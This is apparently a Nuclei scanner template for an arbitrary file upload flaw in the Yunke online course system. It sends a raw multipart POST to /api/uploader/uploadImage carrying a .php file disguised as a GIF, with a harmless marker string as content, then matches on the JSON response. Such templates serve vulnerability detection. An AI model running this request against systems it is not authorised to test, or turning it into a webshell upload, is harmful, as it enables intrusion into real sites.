id: DVB-2024-6594

info:
  name: 云课网校系统uploadImage接口存在任意文件上传漏洞
  author: yunke
  severity: high
  tags: upload

http:
  - raw:
      - |
        POST /api/uploader/uploadImage HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
        Cache-Control: no-cache
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryLZbmKeasWgo2gPtU
        x-requested-with: XMLHttpRequest

        ------WebKitFormBoundaryLZbmKeasWgo2gPtU
        Content-Disposition: form-data; name="file"; filename="1G3311040N.php"
        Content-Type: image/gif
        
        d36s2ew269df2f
        ------WebKitFormBoundaryLZbmKeasWgo2gPtU--

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"code":'
          - '"url":"'
        condition: and
      - type: dsl
        dsl:
          - 'len(body) < 100'
    matchers-condition: and
